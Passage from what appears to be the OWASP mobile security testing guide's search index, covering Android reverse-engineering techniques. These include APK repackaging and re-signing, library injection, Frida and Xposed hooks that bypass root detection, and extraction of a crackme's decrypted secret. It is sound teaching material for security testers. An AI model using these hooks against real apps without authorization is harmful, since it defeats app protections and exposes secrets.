debug builds. If the system property <code>ro.debuggable</code> is set to \"0\", Android disallows both JDWP and native debugging of release builds. Although this is easy to bypass, you're still likely to encounter limitations, such as a lack of line breakpoints. Nevertheless, even an imperfect debugger is still an invaluable tool, being able to inspect the runtime state of a program makes understanding the program a lot easier.</p> <p>To convert a release build into a debuggable build, you need to modify a flag in the Android Manifest file (AndroidManifest.xml). Once you've unpacked the app (e.g. <code>apktool d --no-src UnCrackable-Level1.apk</code>) and decoded the Android Manifest, add <code>android:debuggable=\"true\"</code> to it using a text editor:</p> <pre><code>&lt;application android:allowBackup=\"true\" android:debuggable=\"true\" android:icon=\"@drawable/ic_launcher\" android:label=\"@string/app_name\" android:name=\"com.xxx.xxx.xxx\" android:theme=\"@style/AppTheme\"&gt;\n</code></pre> <p>Even if we haven't altered the source code, this modification also breaks the APK signature, so you'll also have to re-sign the altered APK archive.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0038/#patching-react-native-applications","title":"Patching React Native applications","text":"<p>If the React Native framework has been used for developing then the main application code is located in the file <code>assets/index.android.bundle</code>. This file contains the JavaScript code. Most of the time, the JavaScript code in this file is minified. By using the tool JStillery a human readable version of the file can be retrieved, allowing code analysis. The CLI version of JStillery or the local server should be preferred instead of using the online version as otherwise source code is sent and disclosed to a third-party.</p> <p>The following approach can be used in order to patch the JavaScript file:</p> <ol> <li>Unpack the APK archive using <code>apktool</code> tool.</li> <li>Copy the content of the file <code>assets/index.android.bundle</code> into a temporary file.</li> <li>Use <code>JStillery</code> to beautify and deobfuscate the content of the temporary file.</li> <li>Identify where the code should be patched in the temporary file and implement the changes.</li> <li>Put the patched code on a single line and copy it in the original <code>assets/index.android.bundle</code> file.</li> <li>Repack the APK archive using <code>apktool</code> tool and sign it before installing it on the target device/emulator.</li> </ol>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0039/","title":"MASTG-TECH-0039: Repackaging & Re-Signing","text":"","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0039/#repackaging","title":"Repackaging","text":"<p>You can easily repackage an app by doing the following:</p> <pre><code>cd UnCrackable-Level1\napktool b\nzipalign -v 4 dist/UnCrackable-Level1.apk ../UnCrackable-Repackaged.apk\n</code></pre> <p>Note that the Android Studio build tools directory must be in the path. It is located at <code>[SDK-Path]/build-tools/[version]</code>. The <code>zipalign</code> and <code>apksigner</code> tools are in this directory.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0039/#re-signing","title":"Re-Signing","text":"<p>Before re-signing, you first need a code-signing certificate. If you have built a project in Android Studio before, the IDE has already created a debug keystore and certificate in <code>$HOME/.android/debug.keystore</code>. The default password for this KeyStore is \"android\" and the key is called \"androiddebugkey\".</p> <p>The standard Java distribution includes <code>keytool</code> for managing KeyStores and certificates. You can create your own signing certificate and key, then add it to the debug KeyStore:</p> <pre><code>keytool -genkey -v -keystore ~/.android/debug.keystore -alias signkey -keyalg RSA -keysize 2048 -validity 20000\n</code></pre> <p>After the certificate is available, you can re-sign the APK with it. Be sure that <code>apksigner</code> is in the path and that you run it from the folder where your repackaged APK is located.</p> <pre><code>apksigner sign --ks  ~/.android/debug.keystore --ks-key-alias signkey UnCrackable-Repackaged.apk\n</code></pre> <p>Note: If you experience JRE compatibility issues with <code>apksigner</code>, you can use <code>jarsigner</code> instead. When you do this, <code>zipalign</code> must be called after signing.</p> <pre><code>jarsigner -verbose -keystore ~/.android/debug.keystore ../UnCrackable-Repackaged.apk signkey\nzipalign -v 4 dist/UnCrackable-Level1.apk ../UnCrackable-Repackaged.apk\n</code></pre> <p>Now you may reinstall the app:</p> <pre><code>adb install UnCrackable-Repackaged.apk\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0040/","title":"MASTG-TECH-0040: Waiting for the Debugger","text":"<p>The  Android UnCrackable L1 is not stupid: it notices that it has been run in debuggable mode and reacts by shutting down. A modal dialog is shown immediately, and the crackme terminates once you tap \"OK\".</p> <p>Fortunately, Android's \"Developer options\" contain the useful \"Wait for Debugger\" feature, which allows you to automatically suspend an app during startup until a JDWP debugger connects. With this feature, you can connect the debugger before the detection mechanism runs, and trace, debug, and deactivate that mechanism. It's really an unfair advantage, but, on the other hand, reverse engineers never play fair!</p> <p></p> <p>In the Developer options, pick <code>Uncrackable1</code> as the debugging application and activate the \"Wait for Debugger\" switch.</p> <p></p> <p>Note: Even with <code>ro.debuggable</code> set to \"1\" in <code>default.prop</code>, an app won't show up in the \"debug app\" list unless the <code>android:debuggable</code> flag is set to <code>\"true\"</code> in the Android Manifest.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0041/","title":"MASTG-TECH-0041: Library Injection","text":"<p>In the previous section we learned about patching application code to assist in our analysis, but this approach has several limitations. For instance, you'd like to log everything that's being sent over the network without having to perform a MITM attack. For this you'd have to patch all possible calls to the network APIs, which can quickly become impractical when dealing with large applications. In addition, the fact that patching is unique to each application can also be considered a shortcoming, as this code cannot be easily reused.</p> <p>Using library injection you can develop reusable libraries and inject them to different applications, effectively making them behave differently without having to modify their original source code. This is known as DLL injection on Windows (broadly used to modify and bypass anti-cheat mechanisms in games), <code>LD_PRELOAD</code> on Linux and <code>DYLD_INSERT_LIBRARIES</code> on macOS. On Android and iOS, a common example is using the Frida Gadget whenever Frida's so-called Injected mode of operation isn't suitable (i.e. you cannot run the Frida server on the target device). In this situation, you can inject the Gadget library by using the same methods you're going to learn in this section.</p> <p>Library injection is desirable in many situations such as:</p> <ul> <li>Performing process introspection (e.g. listing classes, tracing method calls, monitoring accessed files, monitoring network access, obtaining direct memory access).</li> <li>Supporting or replacing existing code with your own implementations (e.g. replace a function that should give random numbers).</li> <li>Introducing new features to an existing application.</li> <li>Debugging and fixing elusive runtime bugs on code for which you don't have the original source.</li> <li>Enable dynamic testing on a non-rooted device (e.g. with Frida).</li> </ul> <p>In this section, we will learn about techniques for performing library injection on Android, which basically consist of patching the application code (smali or native) or alternatively using the <code>LD_PRELOAD</code> feature provided by the OS loader itself.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0041/#patching-the-applications-smali-code","title":"Patching the Application's Smali Code","text":"<p>An Android application's decompiled smali code can be patched to introduce a call to <code>System.loadLibrary</code>. The following smali patch injects a library named libinject.so:</p> <pre><code>const-string v0, \"inject\"\ninvoke-static {v0}, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V\n</code></pre> <p>Ideally you should insert the above code early in the application lifecycle, for instance in the <code>onCreate</code> method. It is important to remember to add the library libinject.so in the respective architecture folder (armeabi-v7a, arm64-v8a, x86) of the <code>lib</code> folder in the APK. Finally, you need to re-sign the application before using it.</p> <p>A well-known use case of this technique is loading the Frida gadget to an application, especially while working on a non-rooted device (this is what <code>objection patchapk</code> basically does).</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0041/#patching-applications-native-library","title":"Patching Application's Native Library","text":"<p>Many Android applications use native code in addition to Java code for various performance and security reasons. The native code is present in the form of ELF shared libraries. An ELF executable includes a list of shared libraries (dependencies) that are linked to the executable for it to function optimally. This list can be modified to insert an additional library to be injected into the process.</p> <p>Modifying the ELF file structure manually to inject a library can be cumbersome and prone to errors. However, this task can be performed with relative ease using  LIEF (Library to Instrument Executable Formats). Using it requires only a few lines of Python code as shown below:</p> <pre><code>import lief\n\nlibnative = lief.parse(\"libnative.so\")\nlibnative.add_library(\"libinject.so\") # Injection!\nlibnative.write(\"libnative.so\")\n</code></pre> <p>In the above example, libinject.so library is injected as a dependency of a native library (libnative.so), which the application already loads by default. Frida gadget can be injected into an application using this approach as explained in detail in LIEF's documentation. As in the previous section, it is important to remember adding the library to the respective architecture <code>lib</code> folder in the APK and finally re-signing the application.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0041/#preloading-symbols","title":"Preloading Symbols","text":"<p>Above we looked into techniques which require some kind of modification of the application's code. A library can also be injected into a process using functionalities offered by the loader of the operating system. On Android, which is a Linux based OS, you can load an additional library by setting the <code>LD_PRELOAD</code> environment variable.</p> <p>As the ld.so man page states, symbols loaded from the library passed using <code>LD_PRELOAD</code> always get precedence, i.e. they are searched first by the loader while resolving the symbols, effectively overriding the original ones. This feature is often used to inspect the input parameters of some commonly used libc functions such as <code>fopen</code>, <code>read</code>, <code>write</code>, <code>strcmp</code>, etc., specially in obfuscated programs, where understanding their behavior may be challenging. Therefore, having an insight on which files are being opened or which strings are being compared may be very valuable. The key idea here is \"function wrapping\", meaning that you cannot patch system calls such as libc's <code>fopen</code>, but you can override (wrap) it including custom code that will, for instance, print the input parameters for you and still call the original <code>fopen</code> remaining transparent to the caller.</p> <p>On Android, setting <code>LD_PRELOAD</code> is slightly different compared to other Linux distributions. If you recall from the \"Platform Overview\" section, every application in Android is forked from Zygote, which is started very early during the Android boot-up. Thus, setting <code>LD_PRELOAD</code> on Zygote is not possible. As a workaround for this problem, Android supports the <code>setprop</code> (set property) functionality. Below you can see an example for an application with package name <code>com.foo.bar</code> (note the additional <code>wrap.</code> prefix):</p> <pre><code>setprop wrap.com.foo.bar LD_PRELOAD=/data/local/tmp/libpreload.so\n</code></pre> <p>Please note that if the library to be preloaded does not have SELinux context assigned, from Android 5.0 (API level 21) onwards, you need to disable SELinux to make <code>LD_PRELOAD</code> work, which may require root.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0042/","title":"MASTG-TECH-0042: Getting Loaded Classes and Methods Dynamically","text":"<p>You can use the command <code>Java</code> in the Frida CLI to access the Java runtime and retrieve information from the running app. Remember that, unlike Frida for iOS, in Android you need to wrap your code inside a <code>Java.perform</code> function. Thus, it's more convenient to use Frida scripts to e.g. get a list of loaded Java classes and their corresponding methods and fields or for more complex information gathering or instrumentation. One such scripts is listed below. The script to list class's methods used below is available on Github.</p> <pre><code>// Get list of loaded Java classes and methods\n\n// Filename: java_class_listing.js\n\nJava.perform(function() {\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n            console.log(className);\n            describeJavaClass(className);\n        },\n        onComplete: function() {}\n    });\n});\n\n// Get the methods and fields\nfunction describeJavaClass(className) {\n  var jClass = Java.use(className);\n  console.log(JSON.stringify({\n    _name: className,\n    _methods: Object.getOwnPropertyNames(jClass.__proto__).filter(function(m) {\n      return !m.startsWith('$') // filter out Frida related special properties\n        || m == 'class' || m == 'constructor' // optional\n    }),\n    _fields: jClass.class.getFields().map(function(f) {\n      return( f.toString());\n    })\n  }, null, 2));\n}\n</code></pre> <p>After saving the script to a file called java_class_listing.js, you can tell Frida CLI to load it by using the flag <code>-l</code> and inject it to the process ID specified by <code>-p</code>.</p> <pre><code>frida -U -l java_class_listing.js -p &lt;pid&gt;\n\n// Output\n[Huawei Nexus 6P::sg.vantagepoint.helloworldjni]-&gt;\n...\n\ncom.scottyab.rootbeer.sample.MainActivity\n{\n  \"_name\": \"com.scottyab.rootbeer.sample.MainActivity\",\n  \"_methods\": [\n  ...\n    \"beerView\",\n    \"checkRootImageViewList\",\n    \"floatingActionButton\",\n    \"infoDialog\",\n    \"isRootedText\",\n    \"isRootedTextDisclaimer\",\n    \"mActivity\",\n    \"GITHUB_LINK\"\n  ],\n  \"_fields\": [\n    \"public static final int android.app.Activity.DEFAULT_KEYS_DIALER\",\n...\n</code></pre> <p>Given the verbosity of the output, the system classes can be filtered out programmatically to make output more readable and relevant to the use case.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0043/","title":"MASTG-TECH-0043: Method Hooking","text":"","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0043/#xposed","title":"Xposed","text":"<p>Let's assume you're testing an app that's stubbornly quitting on your rooted device. You decompile the app and find the following highly suspect method:</p> <pre><code>package com.example.a.b\n\npublic static boolean c() {\n  int v3 = 0;\n  boolean v0 = false;\n\n  String[] v1 = new String[]{\"/sbin/\", \"/system/bin/\", \"/system/xbin/\", \"/data/local/xbin/\",\n    \"/data/local/bin/\", \"/system/sd/xbin/\", \"/system/bin/failsafe/\", \"/data/local/\"};\n\n    int v2 = v1.length;\n\n    for(int v3 = 0; v3 &lt; v2; v3++) {\n      if(new File(String.valueOf(v1[v3]) + \"su\").exists()) {\n         v0 = true;\n         return v0;\n      }\n    }\n\n    return v0;\n}\n</code></pre> <p>This method iterates through a list of directories and returns <code>true</code> (device rooted) if it finds the <code>su</code> binary in any of them. Checks like this are easy to deactivate all you have to do is replace the code with something that returns \"false\". Method hooking with an Xposed module is one way to do this (see \"Android Basic Security Testing\" for more details on Xposed installation and basics).</p> <p>The method <code>XposedHelpers.findAndHookMethod</code> allows you to override existing class methods. By inspecting the decompiled source code, you can find out that the method performing the check is <code>c</code>. This method is located in the class <code>com.example.a.b</code>. The following is an Xposed module that overrides the function so that it always returns false:</p> <pre><code>package com.awesome.pentestcompany;\n\nimport static de.robv.android.xposed.XposedHelpers.findAndHookMethod;\nimport de.robv.android.xposed.IXposedHookLoadPackage;\nimport de.robv.android.xposed.XposedBridge;\nimport de.robv.android.xposed.XC_MethodHook;\nimport de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;\n\npublic class DisableRootCheck implements IXposedHookLoadPackage {\n\n    public void handleLoadPackage(final LoadPackageParam lpparam) throws Throwable {\n        if (!lpparam.packageName.equals(\"com.example.targetapp\"))\n            return;\n\n        findAndHookMethod(\"com.example.a.b\", lpparam.classLoader, \"c\", new XC_MethodHook() {\n            @Override\n\n            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {\n                XposedBridge.log(\"Caught root check!\");\n                param.setResult(false);\n            }\n\n        });\n    }\n}\n</code></pre> <p>Just like regular Android apps, modules for Xposed are developed and deployed with Android Studio. For more details on writing, compiling, and installing Xposed modules, refer to the tutorial provided by its author, rovo89.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0043/#frida","title":"Frida","text":"<p>We'll use Frida to solve the  Android UnCrackable L1 and demonstrate how we can easily bypass root detection and extract secret data from the app.</p> <p>When you start the crackme app on an emulator or a rooted device, you'll find that the it presents a dialog box and exits as soon as you press \"OK\" because it detected root:</p> <p></p> <p>Let's see how we can prevent this.</p> <p>The main method (decompiled with CFR) looks like this:</p> <pre><code>package sg.vantagepoint.uncrackable1;\n\nimport android.app.Activity;\nimport android.app.AlertDialog;\nimport android.content.Context;\nimport android.content.DialogInterface;\nimport android.os.Bundle;\nimport android.text.Editable;\nimport android.view.View;\nimport android.widget.EditText;\nimport sg.vantagepoint.a.b;\nimport sg.vantagepoint.a.c;\nimport sg.vantagepoint.uncrackable1.a;\n\npublic class MainActivity\nextends Activity {\n    private void a(String string) {\n        AlertDialog alertDialog = new AlertDialog.Builder((Context)this).create();\n        alertDialog.setTitle((CharSequence)string);\n        alertDialog.setMessage((CharSequence)\"This is unacceptable. The app is now going to exit.\");\n        alertDialog.setButton(-3, (CharSequence)\"OK\", new DialogInterface.OnClickListener(){\n\n            public void onClick(DialogInterface dialogInterface, int n) {\n                System.exit((int)0);\n            }\n        });\n        alertDialog.setCancelable(false);\n        alertDialog.show();\n    }\n\n    protected void onCreate(Bundle bundle) {\n        if (c.a() || c.b() || c.c()) {\n            this.a(\"Root detected!\");\n        }\n        if (b.a(this.getApplicationContext())) {\n            this.a(\"App is debuggable!\");\n        }\n        super.onCreate(bundle);\n        this.setContentView(2130903040);\n    }\n\n    /*\n     * Enabled aggressive block sorting\n     */\n    public void verify(View object) {\n        object = ((EditText)this.findViewById(2130837505)).getText().toString();\n        AlertDialog alertDialog = new AlertDialog.Builder((Context)this).create();\n        if (a.a((String)object)) {\n            alertDialog.setTitle((CharSequence)\"Success!\");\n            object = \"This is the correct secret.\";\n        } else {\n            alertDialog.setTitle((CharSequence)\"Nope...\");\n            object = \"That's not it. Try again.\";\n        }\n        alertDialog.setMessage((CharSequence)object);\n        alertDialog.setButton(-3, (CharSequence)\"OK\", new DialogInterface.OnClickListener(){\n\n            public void onClick(DialogInterface dialogInterface, int n) {\n                dialogInterface.dismiss();\n            }\n        });\n        alertDialog.show();\n    }\n}\n</code></pre> <p>Notice the \"Root detected\" message in the <code>onCreate</code> method and the various methods called in the preceding <code>if</code>-statement (which perform the actual root checks). Also note the \"This is unacceptable...\" message from the first method of the class, <code>private void a</code>. Obviously, this method displays the dialog box. There is an <code>alertDialog.onClickListener</code> callback set in the <code>setButton</code> method call, which closes the application via <code>System.exit</code> after successful root detection. With Frida, you can prevent the app from exiting by hooking the <code>MainActivity.a</code> method or the callback inside it. The example below shows how you can hook <code>MainActivity.a</code> and prevent it from ending the application.</p> <pre><code>setImmediate(function() { //prevent timeout\n    console.log(\"[*] Starting script\");\n\n    Java.perform(function() {\n      var mainActivity = Java.use(\"sg.vantagepoint.uncrackable1.MainActivity\");\n      mainActivity.a.implementation = function(v) {\n         console.log(\"[*] MainActivity.a called\");\n      };\n      console.log(\"[*] MainActivity.a modified\");\n\n    });\n});\n</code></pre> <p>Wrap your code in the function <code>setImmediate</code> to prevent timeouts (you may or may not need to do this), then call <code>Java.perform</code> to use Frida's methods for dealing with Java. Afterwards retrieve a wrapper for <code>MainActivity</code> class and overwrite its <code>a</code> method. Unlike the original, the new version of <code>a</code> just writes console output and doesn't exit the app. An alternative solution is to hook <code>onClick</code> method of the <code>OnClickListener</code> interface. You can overwrite the <code>onClick</code> method and prevent it from ending the application with the <code>System.exit</code> call. If you want to inject your own Frida script, it should either disable the <code>AlertDialog</code> entirely or change the behavior of the <code>onClick</code> method so the app does not exit when you click \"OK\".</p> <p>Save the above script as <code>uncrackable1.js</code> and load it:</p> <pre><code>frida -U -f owasp.mstg.uncrackable1 -l uncrackable1.js --no-pause\n</code></pre> <p>After you see the \"MainActivity.a modified\" message and the app will not exit anymore.</p> <p>You can now try to input a \"secret string\". But where do you get it?</p> <p>If you look at the class <code>sg.vantagepoint.uncrackable1.a</code>, you can see the encrypted string with which your input gets compared:</p> <pre><code>package sg.vantagepoint.uncrackable1;\n\nimport android.util.Base64;\nimport android.util.Log;\n\npublic class a {\n    public static boolean a(String string) {\n\n        byte[] arrby = Base64.decode((String)\"5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=\", (int)0);\n\n        try {\n            arrby = sg.vantagepoint.a.a.a(a.b(\"8d127684cbc37c17616d806cf50473cc\"), arrby);\n        }\n        catch (Exception exception) {\n            StringBuilder stringBuilder = new StringBuilder();\n            stringBuilder.append(\"AES error:\");\n            stringBuilder.append(exception.getMessage());\n            Log.d((String)\"CodeCheck\", (String)stringBuilder.toString());\n            arrby = new byte[]{};\n        }\n        return string.equals((Object)new String(arrby));\n    }\n\n    public static byte[] b(String string) {\n        int n = string.length();\n        byte[] arrby = new byte[n / 2];\n        for (int i = 0; i &lt; n; i += 2) {\n            arrby[i / 2] = (byte)((Character.digit((char)string.charAt(i), (int)16) &lt;&lt; 4) + Character.digit((char)string.charAt(i + 1), (int)16));\n        }\n        return arrby;\n    }\n}\n</code></pre> <p>Look at the <code>string.equals</code> comparison at the end of the <code>a</code> method and the creation of the string <code>arrby</code> in the <code>try</code> block above. <code>arrby</code> is the return value of the function <code>sg.vantagepoint.a.a.a</code>. <code>string.equals</code> comparison compares your input with <code>arrby</code>. So we want the return value of <code>sg.vantagepoint.a.a.a.</code></p> <p>Instead of reversing the decryption routines to reconstruct the secret key, you can simply ignore all the decryption logic in the app and hook the <code>sg.vantagepoint.a.a.a</code> function to catch its return value. Here is the complete script that prevents exiting on root and intercepts the decryption of the secret string:</p> <pre><code>setImmediate(function() { //prevent timeout\n    console.log(\"[*] Starting script\");\n\n    Java.perform(function() {\n        var mainActivity = Java.use(\"sg.vantagepoint.uncrackable1.MainActivity\");\n        mainActivity.a.implementation = function(v) {\n           console.log(\"[*] MainActivity.a called\");\n        };\n        console.log(\"[*] MainActivity.a modified\");\n\n        var aaClass = Java.use(\"sg.vantagepoint.a.a\");\n        aaClass.a.implementation = function(arg1, arg2) {\n        var retval = this.a(arg1, arg2);\n        var password = '';\n        for(var i = 0; i &lt; retval.length; i++) {\n            password += String.fromCharCode(retval[i]);\n        }\n\n        console.log(\"[*] Decrypted: \" + password);\n            return retval;\n        };\n        console.log(\"[*] sg.vantagepoint.a.a.a modified\");\n    });\n});\n</code></pre> <p>After running the script in Frida and seeing the \"[*] sg.vantagepoint.a.a.a modified\" message in the console, enter a random value for \"secret string\" and press verify. You should get an output similar to the following:</p> <pre><code>$ frida -U -f owasp.mstg.uncrackable1 -l uncrackable1.js --no-pause\n\n[*] Starting script\n[USB::Android Emulator 5554::sg.vantagepoint.uncrackable1]-&gt; [*] MainActivity.a modified\n[*] sg.vantagepoint.a.a.a modified\n[*] MainActivity.a called.\n[*] Decrypted: I want to believe\n</code></pre> <p>The hooked function outputted the decrypted string. You extracted the secret string without having to dive too deep into the application code and its decryption routines.</p> <p>You've now covered the basics of static/dynamic analysis on Android. Of course, the only way to really learn it is hands-on experience: build your own projects in Android Studio, observe how your code gets translated into bytecode and native code, and try to crack our challenges.</p> <p>In the remaining sections, we'll introduce a few advanced subjects, including process exploration, kernel modules and dynamic execution.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0044/","title":"MASTG-TECH-0044: Process Exploration","text":"<p>When testing an app, process exploration can provide the tester with deep insights into the app process memory. It can be achieved via runtime instrumentation and allows to perform tasks such as:</p> <ul> <li>Retrieving the memory map and loaded libraries.</li> <li>Searching for occurrences of certain data.</li> <li>After doing a search, obtaining the location of a certain offset in the memory map.</li> <li>Performing a memory dump and inspect or reverse engineer the binary data offline.</li> <li>Reverse engineering a native library while it's running.</li> </ul> <p>As you can see, these passive tasks help us collect information. This Information is often used for other techniques, such as method hooking.</p> <p>In the following sections you will be using  r2frida to retrieve information straight from the app runtime. Please refer to r2frida's official installation instructions. First start by opening an r2frida session to the target app (e.g. HelloWorld JNI APK) that should be running on your Android phone (connected per USB). Use the following command:</p> <pre><code>r2 frida://usb//sg.vantagepoint.helloworldjni\n</code></pre> <p>See all options with <code>r2 frida://?</code>.</p> <p>Once in the r2frida session, all commands start with <code>:</code>. For example, in radare2 you'd run <code>i</code> to display the binary information, but in r2frida you'd use <code>:i</code>.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0044/#memory-maps-and-inspection","title":"Memory Maps and Inspection","text":"<p>You can retrieve the app's memory maps by running <code>:dm</code>. The output in Android can get very long (e.g. between 1500 and 2000 lines), to narrow your search and see only what directly belongs to the app apply a grep (<code>~</code>) by package name <code>:dm~&lt;package_name&gt;</code>:</p> <pre><code>[0x00000000]&gt; :dm~sg.vantagepoint.helloworldjni\n0x000000009b2dc000 - 0x000000009b361000 rw- /dev/ashmem/dalvik-/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.art (deleted)\n0x000000009b361000 - 0x000000009b36e000 --- /dev/ashmem/dalvik-/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.art (deleted)\n0x000000009b36e000 - 0x000000009b371000 rw- /dev/ashmem/dalvik-/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.art (deleted)\n0x0000007d103be000 - 0x0000007d10686000 r-- /data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.vdex\n0x0000007d10dd0000 - 0x0000007d10dee000 r-- /data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex\n0x0000007d10dee000 - 0x0000007d10e2b000 r-x /data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex\n0x0000007d10e3a000 - 0x0000007d10e3b000 r-- /data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex\n0x0000007d10e3b000 - 0x0000007d10e3c000 rw- /data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex\n0x0000007d1c499000 - 0x0000007d1c49a000 r-x /data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so\n0x0000007d1c4a9000 - 0x0000007d1c4aa000 r-- /data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so\n0x0000007d1c4aa000 - 0x0000007d1c4ab000 rw- /data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so\n0x0000007d1c516000 - 0x0000007d1c54d000 r-- /data/app/sg.vantagepoint.helloworldjni-1/base.apk\n0x0000007dbd23c000 - 0x0000007dbd247000 r-- /data/app/sg.vantagepoint.helloworldjni-1/base.apk\n0x0000007dc05db000 - 0x0000007dc05dc000 r-- /data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.art\n</code></pre> <p>While you're searching or exploring the app memory, you can always verify where you're located at each moment (where your current offset is located) in the memory map. Instead of noting and searching for the memory address in this list you can simply run <code>:dm.</code>. You'll find an example in the following section \"In-Memory Search\".</p> <p>If you're only interested in the modules (binaries and libraries) that the app has loaded, you can use the command <code>:il</code> to list them all:</p> <pre><code>[0x00000000]&gt; :il\n0x000000558b1fd000 app_process64\n0x0000007dbc859000 libandroid_runtime.so\n0x0000007dbf5d7000 libbinder.so\n0x0000007dbff4d000 libcutils.so\n0x0000007dbfd13000 libhwbinder.so\n0x0000007dbea00000 liblog.so\n0x0000007dbcf17000 libnativeloader.so\n0x0000007dbf21c000 libutils.so\n0x0000007dbde4b000 libc++.so\n0x0000007dbe09b000 libc.so\n...\n0x0000007d10dd0000 base.odex\n0x0000007d1c499000 libnative-lib.so\n0x0000007d2354e000 frida-agent-64.so\n0x0000007dc065d000 linux-vdso.so.1\n0x0000007dc065f000 linker64\n</code></pre> <p>As you might expect you can correlate the addresses of the libraries with the memory maps: e.g. the native library of the app is located at <code>0x0000007d1c499000</code> and optimized dex (base.odex) at <code>0x0000007d10dd0000</code>.</p> <p>You can also use objection to display the same information.</p> <pre><code>$ objection --gadget sg.vantagepoint.helloworldjni explore\n\nsg.vantagepoint.helloworldjni on (google: 8.1.0) [usb] # memory list modules\nSave the output by adding `--json modules.json` to this command\n\nName                                             Base          Size                  Path\n-----------------------------------------------  ------------  --------------------  --------------------------------------------------------------------\napp_process64                                    0x558b1fd000  32768 (32.0 KiB)      /system/bin/app_process64\nlibandroid_runtime.so                            0x7dbc859000  1982464 (1.9 MiB)     /system/lib64/libandroid_runtime.so\nlibbinder.so                                     0x7dbf5d7000  557056 (544.0 KiB)    /system/lib64/libbinder.so\nlibcutils.so                                     0x7dbff4d000  77824 (76.0 KiB)      /system/lib64/libcutils.so\nlibhwbinder.so                                   0x7dbfd13000  163840 (160.0 KiB)    /system/lib64/libhwbinder.so\nbase.odex                                        0x7d10dd0000  442368 (432.0 KiB)    /data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex\nlibnative-lib.so                                 0x7d1c499000  73728 (72.0 KiB)      /data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so\n</code></pre> <p>You can even directly see the size and the path to that binary in the Android file system.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0044/#in-memory-search","title":"In-Memory Search","text":"<p>In-memory search is a very useful technique to test for sensitive data that might be present in the app memory.</p> <p>See r2frida's help on the search command (<code>:/?</code>) to learn about the search command and get a list of options. The following shows only a subset of them:</p> <pre><code>[0x00000000]&gt; :/?\n /      search\n /j     search json\n /w     search wide\n /wj    search wide json\n /x     search hex\n /xj    search hex json\n...\n</code></pre> <p>You can adjust your search by using the search settings <code>:e~search</code>. For example, <code>:e search.quiet=true;</code> will print only the results and hide search progress:</p> <pre><code>[0x00000000]&gt; :e~search\ne search.in=perm:r--\ne search.quiet=false\n</code></pre> <p>For now, we'll continue with the defaults and concentrate on string search. This app is actually very simple, it loads the string \"Hello from C++\" from its native library and displays it to us. You can start by searching for \"Hello\" and see what r2frida finds:</p> <pre><code>[0x00000000]&gt; :/ Hello\nSearching 5 bytes: 48 65 6c 6c 6f\n...\nhits: 11\n0x13125398 hit0_0 HelloWorldJNI\n0x13126b90 hit0_1 Hello World!\n0x1312e220 hit0_2 Hello from C++\n0x70654ec5 hit0_3 Hello\n0x7d1c499560 hit0_4 Hello from C++\n0x7d1c4a9560 hit0_5 Hello from C++\n0x7d1c51cef9 hit0_6 HelloWorldJNI\n0x7d30ba11bc hit0_7 Hello World!\n0x7d39cd796b hit0_8 Hello.java\n0x7d39d2024d hit0_9 Hello;\n0x7d3aa4d274 hit0_10 Hello\n</code></pre> <p>Now you'd like to know where these addresses actually are. You may do so by running the <code>:dm.</code> command for all <code>@@</code> hits matching the glob <code>hit0_*</code>:</p> <pre><code>[0x00000000]&gt; :dm.@@ hit0_*\n0x0000000013100000 - 0x0000000013140000 rw- /dev/ashmem/dalvik-main space (region space) (deleted)\n0x0000000013100000 - 0x0000000013140000 rw- /dev/ashmem/dalvik-main space (region space) (deleted)\n0x0000000013100000 - 0x0000000013140000 rw- /dev/ashmem/dalvik-main space (region space) (deleted)\n0x00000000703c2000 - 0x00000000709b5000 rw- /data/dalvik-cache/arm64/system@framework@boot-framework.art\n0x0000007d1c499000 - 0x0000007d1c49a000 r-x /data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so\n0x0000007d1c4a9000 - 0x0000007d1c4aa000 r-- /data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so\n0x0000007d1c516000 - 0x0000007d1c54d000 r-- /data/app/sg.vantagepoint.helloworldjni-1/base.apk\n0x0000007d30a00000 - 0x0000007d30c00000 rw-\n0x0000007d396bc000 - 0x0000007d3a998000 r-- /system/framework/arm64/boot-framework.vdex\n0x0000007d396bc000 - 0x0000007d3a998000 r-- /system/framework/arm64/boot-framework.vdex\n0x0000007d3a998000 - 0x0000007d3aa9c000 r-- 